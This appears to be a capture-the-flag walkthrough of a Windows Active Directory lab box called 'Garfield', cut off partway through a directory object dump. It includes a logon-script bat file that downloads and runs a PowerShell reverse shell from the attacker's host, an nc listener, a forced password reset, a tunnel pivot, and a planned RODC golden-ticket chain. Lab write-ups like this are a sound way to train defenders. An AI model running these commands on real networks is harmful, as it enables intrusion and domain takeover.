As is common in real life pentests, you will start the Garfield box with credentials for the following account j.arbuckle / Th1sD4mnC4t!@1978

## NMAP SCAN 
```
nmap -sSCV -p- 10.129.198.245                                                  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-03 21:07 +0700
Nmap scan report for 10.129.244.207
Host is up (0.083s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-03 16:41:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: GARFIELD
|   NetBIOS_Domain_Name: GARFIELD
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: garfield.htb
|   DNS_Computer_Name: DC01.garfield.htb
|   DNS_Tree_Name: garfield.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2026-05-03T16:42:42+00:00
| ssl-cert: Subject: commonName=DC01.garfield.htb
| Not valid before: 2026-02-13T01:10:36
|_Not valid after:  2026-08-15T01:10:36
|_ssl-date: 2026-05-03T16:43:23+00:00; +2h30m02s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49905/tcp open  msrpc         Microsoft Windows RPC
64057/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 2h30m01s, deviation: 0s, median: 2h30m01s
| smb2-time: 
|   date: 2026-05-03T16:42:45
|_  start_date: N/A
```

```
nxc smb 10.129.198.245 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --shares --smb-timeout 10
SMB         10.129.244.207  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.207  445    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978 
SMB         10.129.244.207  445    DC01             [*] Enumerated shares
SMB         10.129.244.207  445    DC01             Share           Permissions     Remark
SMB         10.129.244.207  445    DC01             -----           -----------     ------
SMB         10.129.244.207  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.244.207  445    DC01             C$                              Default share
SMB         10.129.244.207  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.244.207  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.244.207  445    DC01             SYSVOL          READ            Logon server share 
```

nothing usefull in smb lets collect users... 
```
impacket-lookupsid j.arbuckle@10.129.198.245               
Impacket v0.13.0.dev0+20250919.210843.8426ec99 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Brute forcing SIDs at 10.129.244.207
[*] StringBinding ncacn_np:10.129.244.207[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2502726253-3859040611-225969357
498: GARFIELD\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: GARFIELD\Administrator (SidTypeUser)
501: GARFIELD\Guest (SidTypeUser)
502: GARFIELD\krbtgt (SidTypeUser)
512: GARFIELD\Domain Admins (SidTypeGroup)
513: GARFIELD\Domain Users (SidTypeGroup)
514: GARFIELD\Domain Guests (SidTypeGroup)
515: GARFIELD\Domain Computers (SidTypeGroup)
516: GARFIELD\Domain Controllers (SidTypeGroup)
517: GARFIELD\Cert Publishers (SidTypeAlias)
518: GARFIELD\Schema Admins (SidTypeGroup)
519: GARFIELD\Enterprise Admins (SidTypeGroup)
520: GARFIELD\Group Policy Creator Owners (SidTypeGroup)
521: GARFIELD\Read-only Domain Controllers (SidTypeGroup)
522: GARFIELD\Cloneable Domain Controllers (SidTypeGroup)
525: GARFIELD\Protected Users (SidTypeGroup)
526: GARFIELD\Key Admins (SidTypeGroup)
527: GARFIELD\Enterprise Key Admins (SidTypeGroup)
553: GARFIELD\RAS and IAS Servers (SidTypeAlias)
571: GARFIELD\Allowed RODC Password Replication Group (SidTypeAlias)
572: GARFIELD\Denied RODC Password Replication Group (SidTypeAlias)
1000: GARFIELD\DC01$ (SidTypeUser)
1101: GARFIELD\DnsAdmins (SidTypeAlias)
1102: GARFIELD\DnsUpdateProxy (SidTypeGroup)
1602: GARFIELD\RODC01$ (SidTypeUser)
1603: GARFIELD\krbtgt_8245 (SidTypeUser)
2101: GARFIELD\RODC Administrators (SidTypeGroup)
3101: GARFIELD\j.arbuckle (SidTypeUser)
3105: GARFIELD\l.wilson (SidTypeUser)
3106: GARFIELD\IT Support (SidTypeGroup)
3107: GARFIELD\l.wilson_adm (SidTypeUser)
3108: GARFIELD\Tier 1 (SidTypeGroup)

```

now lets use rusthound and get the files for bloodhound 
```
rusthound-ce -d garfield.htb -u j.arbuckle@garfield.htb
---------------------------------------------------
Initializing RustHound-CE at 23:56:17 on 05/03/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-05-03T16:56:17Z INFO  rusthound_ce] Verbosity level: Info
[2026-05-03T16:56:17Z INFO  rusthound_ce] Collection method: All
Password: 
[2026-05-03T16:56:25Z INFO  rusthound_ce::ldap] Connected to GARFIELD.HTB Active Directory!
[2026-05-03T16:56:25Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-05-03T16:56:25Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-05-03T16:56:28Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=garfield,DC=htb
[2026-05-03T16:56:28Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-05-03T16:56:30Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=garfield,DC=htb
[2026-05-03T16:56:30Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-05-03T16:56:32Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=garfield,DC=htb
[2026-05-03T16:56:32Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-05-03T16:56:32Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=garfield,DC=htb
[2026-05-03T16:56:32Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-05-03T16:56:32Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=garfield,DC=htb
[2026-05-03T16:56:32Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
[2026-05-03T16:56:32Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10
[2026-05-03T16:56:32Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-05-03T16:56:32Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-05-03T16:56:32Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-05-03T16:56:32Z INFO  rusthound_ce::json::maker::common] 8 users parsed!
[2026-05-03T16:56:32Z INFO  rusthound_ce::json::maker::common] .//20260503235632_garfield-htb_users.json created!
[2026-05-03T16:56:32Z INFO  rusthound_ce::json::maker::common] 63 groups parsed!
[2026-05-03T16:56:32Z INFO  rusthound_ce::json::maker::common] .//20260503235632_garfield-htb_groups.json created!
[2026-05-03T16:56:32Z INFO  rusthound_ce::json::maker::common] 2 computers parsed!
[2026-05-03T16:56:32Z INFO  rusthound_ce::json::maker::common] .//20260503235632_garfield-htb_computers.json created!
[2026-05-03T16:56:32Z INFO  rusthound_ce::json::maker::common] 1 ous parsed!
[2026-05-03T16:56:32Z INFO  rusthound_ce::json::maker::common] .//20260503235632_garfield-htb_ous.json created!
[2026-05-03T16:56:32Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-05-03T16:56:32Z INFO  rusthound_ce::json::maker::common] .//20260503235632_garfield-htb_domains.json created!
[2026-05-03T16:56:32Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-05-03T16:56:32Z INFO  rusthound_ce::json::maker::common] .//20260503235632_garfield-htb_gpos.json created!
[2026-05-03T16:56:32Z INFO  rusthound_ce::json::maker::common] 73 containers parsed!
[2026-05-03T16:56:32Z INFO  rusthound_ce::json::maker::common] .//20260503235632_garfield-htb_containers.json created!

RustHound-CE Enumeration Completed at 23:56:32 on 05/03/26! Happy Graphing!
```

no outbound path from the given user have  to look into smb maybe we find soemthing... 
```
smbclient //10.129.198.245/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978'                                                       
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Aug 13 18:04:43 2025
  ..                                  D        0  Wed Aug 13 18:04:43 2025
  garfield.htb                       Dr        0  Wed Aug 13 18:04:43 2025

                9250815 blocks of size 4096. 966657 blocks available
smb: \> cd garfield.htb\
smb: \garfield.htb\> ls
  .                                   D        0  Wed Aug 13 18:11:05 2025
  ..                                  D        0  Wed Aug 13 18:11:05 2025
  DfsrPrivate                      DHSr        0  Wed Aug 13 18:11:05 2025
  Policies                            D        0  Wed Aug 13 18:04:48 2025
  scripts                             D        0  Wed Jan 28 05:13:47 2026

                9250815 blocks of size 4096. 966657 blocks available
smb: \garfield.htb\> cd scripts\
smb: \garfield.htb\scripts\> ls
  .                                   D        0  Wed Jan 28 05:13:47 2026
  ..                                  D        0  Wed Jan 28 05:13:47 2026
  printerDetect.bat                   A      217  Sat Sep 13 05:20:29 2025

                9250815 blocks of size 4096. 966657 blocks available
smb: \garfield.htb\scripts\> get printerDetect.bat 
getting file \garfield.htb\scripts\printerDetect.bat of size 217 as printerDetect.bat (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
```
```
@echo off
echo Detecting installed printers...
echo ==============================

wmic printer get Name,DeviceID,PortName,DriverName,Shared,Status /format:table

echo.
echo Printer detection completed.
pause
```
so this a a file which  **enumerate installed printers** on a Windows system
maybe there is a subnet.. 
```
smb: \garfield.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\> ls
  .                                   D        0  Tue Sep  9 23:44:18 2025
  ..                                  D        0  Tue Sep  9 23:44:18 2025
  Audit                               D        0  Tue Sep  9 23:44:18 2025
  SecEdit                             D        0  Sat Feb 14 08:14:50 2026

                9250815 blocks of size 4096. 966639 blocks available
smb: \garfield.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\> cd Audit
smb: \garfield.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\Audit\> ls
  .                                   D        0  Tue Sep  9 23:44:18 2025
  ..                                  D        0  Tue Sep  9 23:44:18 2025
  audit.csv                           A      535  Tue Sep  9 23:44:34 2025

                9250815 blocks of size 4096. 966639 blocks available
smb: \garfield.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\Audit\> get audit.csv 
getting file \garfield.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\Audit\audit.csv of size 535 as audit.csv (1.6 KiloBytes/sec) (average 1.1 KiloBytes/sec)

```

found an Audit file.. 
```
 cat audit.csv             
Machine Name,Policy Target,Subcategory,Subcategory GUID,Inclusion Setting,Exclusion Setting,Setting Value
,System,Audit Detailed Directory Service Replication,{0cce923e-69ae-11d9-bed3-505054503030},Success and Failure,,3
,System,Audit Directory Service Access,{0cce923b-69ae-11d9-bed3-505054503030},Success and Failure,,3
,System,Audit Directory Service Changes,{0cce923c-69ae-11d9-bed3-505054503030},Success and Failure,,3
,System,Audit Directory Service Replication,{0cce923d-69ae-11d9-bed3-505054503030},Success and Failure,,3

```
some GUID i think.... 
we can put a reverse shell bat file so when it execute's we get a reverse shell.... 
```
smbclient //10.129.198.245/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978'
Try "help" to get a list of possible commands.
smb: \> cd garfield.htb\
smb: \garfield.htb\> ls
  .                                   D        0  Wed Aug 13 18:11:05 2025
  ..                                  D        0  Wed Aug 13 18:11:05 2025
  DfsrPrivate                      DHSr        0  Wed Aug 13 18:11:05 2025
  Policies                            D        0  Wed Aug 13 18:04:48 2025
  scripts                             D        0  Mon May  4 00:23:35 2026

                9250815 blocks of size 4096. 986609 blocks available
smb: \garfield.htb\> cd scripts\
smb: \garfield.htb\scripts\> ls
  .                                   D        0  Mon May  4 00:27:40 2026
  ..                                  D        0  Mon May  4 00:27:40 2026
  printerDetect.bat                   A      217  Sat Sep 13 05:20:29 2025
  reverse.bat                         A      794  Mon May  4 00:27:40 2026
  revshell.bat                        A     1584  Mon May  4 00:23:35 2026
  shell.bat                           A     1584  Mon May  4 00:21:25 2026

                9250815 blocks of size 4096. 986609 blocks available
smb: \garfield.htb\scripts\> put reverseshell.bat
putting file reverseshell.bat as \garfield.htb\scripts\reverseshell.bat (4.5 kB/s) (average 4.5 kB/s)
```

previous files did not work putting this in base64.... 
did not work...

lets enum more for the smb shares....

```
bloodyAD -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -d garfield.htb --host 10.129.198.245 get writable --otype USER --detail

distinguishedName: CN=Guest,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: CN=krbtgt_8245,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: CN=Jon Arbuckle,CN=Users,DC=garfield,DC=htb
thumbnailPhoto: WRITE
pager: WRITE
mobile: WRITE
homePhone: WRITE
userSMIMECertificate: WRITE
msDS-ExternalDirectoryObjectId: WRITE
msDS-cloudExtensionAttribute20: WRITE
msDS-cloudExtensionAttribute19: WRITE
msDS-cloudExtensionAttribute18: WRITE
msDS-cloudExtensionAttribute17: WRITE
msDS-cloudExtensionAttribute16: WRITE
msDS-cloudExtensionAttribute15: WRITE
msDS-cloudExtensionAttribute14: WRITE
msDS-cloudExtensionAttribute13: WRITE
msDS-cloudExtensionAttribute12: WRITE
msDS-cloudExtensionAttribute11: WRITE
msDS-cloudExtensionAttribute10: WRITE
msDS-cloudExtensionAttribute9: WRITE
msDS-cloudExtensionAttribute8: WRITE
msDS-cloudExtensionAttribute7: WRITE
msDS-cloudExtensionAttribute6: WRITE
msDS-cloudExtensionAttribute5: WRITE
msDS-cloudExtensionAttribute4: WRITE
msDS-cloudExtensionAttribute3: WRITE
msDS-cloudExtensionAttribute2: WRITE
msDS-cloudExtensionAttribute1: WRITE
msDS-GeoCoordinatesLongitude: WRITE
msDS-GeoCoordinatesLatitude: WRITE
msDS-GeoCoordinatesAltitude: WRITE
msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE
msPKI-CredentialRoamingTokens: WRITE
msDS-FailedInteractiveLogonCountAtLastSuccessfulLogon: WRITE
msDS-FailedInteractiveLogonCount: WRITE
msDS-LastFailedInteractiveLogonTime: WRITE
msDS-LastSuccessfulInteractiveLogonTime: WRITE
msDS-SupportedEncryptionTypes: WRITE
msPKIAccountCredentials: WRITE
msPKIDPAPIMasterKeys: WRITE
msPKIRoamingTimeStamp: WRITE
mSMQDigests: WRITE
mSMQSignCertificates: WRITE
userSharedFolderOther: WRITE
userSharedFolder: WRITE
url: WRITE
otherIpPhone: WRITE
ipPhone: WRITE
assistant: WRITE
primaryInternationalISDNNumber: WRITE
primaryTelexNumber: WRITE
otherMobile: WRITE
otherFacsimileTelephoneNumber: WRITE
userCert: WRITE
scriptPath: WRITE
homePostalAddress: WRITE
personalTitle: WRITE
wWWHomePage: WRITE
otherHomePhone: WRITE
streetAddress: WRITE
otherPager: WRITE
info: WRITE
otherTelephone: WRITE
userCertificate: WRITE
preferredDeliveryMethod: WRITE
registeredAddress: WRITE
internationalISDNNumber: WRITE
x121Address: WRITE
facsimileTelephoneNumber: WRITE
teletexTerminalIdentifier: WRITE
telexNumber: WRITE
telephoneNumber: WRITE
physicalDeliveryOfficeName: WRITE
postOfficeBox: WRITE
postalCode: WRITE
postalAddress: WRITE
street: WRITE
st: WRITE
l: WRITE
c: WRITE

distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE
```

```
bloodyAD -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --host 10.129.244.207 set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" scriptPath -v shell.bat
[+] CN=Liz Wilson,CN=Users,DC=garfield,DC=htb's scriptPath has been updated

```

updated the file for l.wilson so he execute's it...

the bat file is... The Inovke-ContPty will be hosted using http
```
@echo off
PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "IEX(IWR http://10.10.14.59/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.59 9001"
PAUSE
exit
```

start the shell like this 
```
stty raw -echo; (stty size; cat) | nc -lvnp 9001
```
```
PS C:\Windows\system32> whoami
garfield\l.wilson
```

l.wilson can change pass for l.wilson_adm so we will do this and get the flag 

```
$newpass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-ADAccountPassword -Identity l.wilson_adm -NewPassword $newpass -Reset
```
``
```
evil-winrm -i 10.129.244.207 -u 'l.wilson_adm' -p 'Password123!'                                       
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> cd ..
*Evil-WinRM* PS C:\Users\l.wilson_adm> cd Desktop
*Evil-WinRM* PS C:\Users\l.wilson_adm\Desktop> type user.txt
f0bf6311d9f0c50817857c6f197df60d

```

and we have the user flag. lets get the root as well.. 
```
*Evil-WinRM* PS C:\Users> ipconfig

Windows IP Configuration


Ethernet adapter vEthernet (Switch01):

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::c4ff:5747:1d3c:fba0%9
   IPv4 Address. . . . . . . . . . . : 192.168.100.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :

Ethernet adapter Ethernet0 3:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::671b:31e5:e8eb:46c9
   Link-local IPv6 Address . . . . . : fe80::99b:d03f:f9b5:b50c%7
   IPv4 Address. . . . . . . . . . . : 10.129.244.207
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:acf1%7
                                       10.129.0.1
```

there's a subnet here lets use ligolo and check it
```
sudo ip tuntap add user $(whoami) mode tun ligolo
[sudo] password for kali: 
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ sudo ip link set ligolo up
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ ligolo-proxy -selfcert
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
INFO[0000] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: dev

ligolo-ng » INFO[0104] Agent joined.                                 id=00155d0bdd00 name="GARFIELD\\l.wilson_adm@DC01" remote="10.129.244.207:54174"
ligolo-ng » session
? Specify a session : 1 - GARFIELD\l.wilson_adm@DC01 - 10.129.244.207:54174 - 00155d0bdd00
[Agent : GARFIELD\l.wilson_adm@DC01] » start
INFO[0110] Starting tunnel to GARFIELD\l.wilson_adm@DC01 (00155d0bdd00) 
WARN[0110] Could not add route 192.168.100.0/24: operation not permitted
```

in windows we run 
```
.\ligolo-ng_agent_0.8.3_windows_amd64.exe -connect 10.10.14.59:11601 -ignore-cert

```

```
sudo ip route add 192.168.100.0/24 dev ligolo

fping -a -g 192.168.100.0/24
192.168.100.1
192.168.100.2
```

found 2 ips lets check them out 

## NMAP SCAN 192.168.100.1 
```
nmap -sSCV -p- 192.168.100.1
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-09 20:18 +0700
Stats: 0:01:47 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 23.46% done; ETC: 20:25 (0:05:49 remaining)
Nmap scan report for 192.168.100.1
Host is up (0.00032s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: GARFIELD
|   NetBIOS_Domain_Name: GARFIELD
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: garfield.htb
|   DNS_Computer_Name: DC01.garfield.htb
|   DNS_Tree_Name: garfield.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2026-05-09T15:53:01+00:00
|_ssl-date: 2026-05-09T15:53:41+00:00; +2h30m03s from scanner time.
| ssl-cert: Subject: commonName=DC01.garfield.htb
| Not valid before: 2026-02-13T01:10:36
|_Not valid after:  2026-08-15T01:10:36
49667/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-05-09T15:53:02
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 2h30m02s, deviation: 0s, median: 2h30m02s
```

it is DC01 
## NMAP SCAN 192.168.100.2 
```
nmap -sT -Pn -p 445,5985 192.168.100.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-09 20:47 +0700
Nmap scan report for 192.168.100.2
Host is up.

PORT     STATE    SERVICE
445/tcp  filtered microsoft-ds
5985/tcp filtered wsman

Nmap done: 1 IP address (1 host up) scanned in 3.53 seconds

```

ok the 2nd sv is reachable, i think its RODC but lets confirm using netexec 

# We will do RBCD same as wee did in PIRATE and get the hash for krb user. Then we will go back to winrm session of the user admin and use the following commands to get admin hash 
## The Attack chain 

```
1. Nmap → DC01.garfield.htb (garfield.htb), clock skew +8h → sync clock
2. Enumerate with j.arbuckle → users, groups, computers
3. BloodHound → j.arbuckle has scriptPath WRITE on l.wilson
                 l.wilson has ForceChangePassword on l.wilson_adm
                 l.wilson_adm has WriteAccountRestrictions + AddSelf on RODC01
4. LDAP → RODC01 msDS-RevealedUsers contains Administrator ← key finding
5. Upload malicious printerDetect.bat to SYSVOL → assign as l.wilson scriptPath
6. Wait for bot logon → shell as l.wilson
7. Set-ADAccountPassword → l.wilson_adm password changed to Password123!
8. WinRM as l.wilson_adm → user.txt ✅
9. AddSelf → RODC Administrators (via bloodyAD)
10. Create ATTACKER$ computer → RBCD on RODC01 → S4U2Proxy ticket
11. Chisel SOCKS tunnel through DC01 → psexec.py → SYSTEM on RODC01
12. Mimikatz lsadump::lsa /inject → krbtgt_8245 AES256 + RODC01$ AES256
13. l.wilson_adm: Clear msDS-NeverRevealGroup on RODC01 (CRITICAL)
14. l.wilson_adm: Add Administrator to msDS-RevealOnDemandGroup
15. Rubeus golden /rodcNumber:8245 → RODC Golden Ticket
16. Rubeus asktgs /keyList → Administrator NTLM hash
17. evil-winrm -H <NTLM> → root.txt ✅
```

add self to RODC 
```
bloodyAD --host garfield.htb -u l.wilson_adm -p 'Password123!' add groupMember "RODC Administrators" l.wilson_adm
```

then we will make a machine 

```
impacket-addcomputer -computer-name 'JJ$' -computer-pass 'Password123!' -dc-ip 10.129.244.207 garfield.htb/l.wilson_adm:'Password123!'
```

```
bloodyAD --host DC01.garfield.htb -u l.wilson_adm -p 'Password123!' get object JJ$

distinguishedName: CN=JJ,CN=Computers,DC=garfield,DC=htb
accountExpires: 9999-12-31 23:59:59.999999+00:00
badPasswordTime: 1601-01-01 00:00:00+00:00
badPwdCount: 0
cn: JJ
codePage: 0
countryCode: 0
dSCorePropagationData: 1601-01-01 00:00:00+00:00
instanceType: 4
isCriticalSystemObject: False
lastLogoff: 1601-01-01 00:00:00+00:00
lastLogon: 1601-01-01 00:00:00+00:00
localPolicyFlags: 0
logonCount: 0
mS-DS-CreatorSID: S-1-5-21-2502726253-3859040611-225969357-3107
nTSecurityDescriptor: O:S-1-5-21-2502726253-3859040611-225969357-512G:S-1-5-21-2502726253-3859040611-225969357-513D:(OA;;WP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-2502726253-3859040611-225969357-3107)(OA;;WP;bf967950-0de6-11d0-a285-00aa003049e2;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-2502726253-3859040611-225969357-3107)(OA;;WP;bf967953-0de6-11d0-a285-00aa003049e2;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-2502726253-3859040611-225969357-3107)(OA;;WP;3e0abfd0-126a-11d0-a060-00aa006c33ed;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-2502726253-3859040611-225969357-3107)(OA;;SW;72e39547-7b18-11d1-adef-00c04fd8d5cd;;S-1-5-21-2502726253-3859040611-225969357-3107)(OA;;SW;f3a64788-5306-11d1-a9c5-0000f80367c1;;S-1-5-21-2502726253-3859040611-225969357-3107)(OA;;WP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-2502726253-3859040611-225969357-3107)(OA;;0x30;bf967a7f-0de6-11d0-a285-00aa003049e2;;S-1-5-21-2502726253-3859040611-225969357-517)(OA;;0x3;bf967aa8-0de6-11d0-a285-00aa003049e2;;S-1-5-32-550)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;S-1-1-0)(OA;;SW;72e39547-7b18-11d1-adef-00c04fd8d5cd;;S-1-5-10)(OA;;SW;f3a64788-5306-11d1-a9c5-0000f80367c1;;S-1-5-10)(OA;;0x30;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-10)(A;;0x20194;;;S-1-5-21-2502726253-3859040611-225969357-3107)(A;;0xf01ff;;;S-1-5-21-2502726253-3859040611-225969357-512)(A;;0xf01ff;;;S-1-5-32-548)(A;;0x3;;;S-1-5-10)(A;;0x20094;;;S-1-5-11)(A;;0xf01ff;;;S-1-5-18)(OA;CIIOID;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;4c164200-20c0-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-2502726253-3859040611-225969357-526)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-2502726253-3859040611-225969357-527)(OA;ID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;;S-1-5-21-2502726253-3859040611-225969357-3107)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-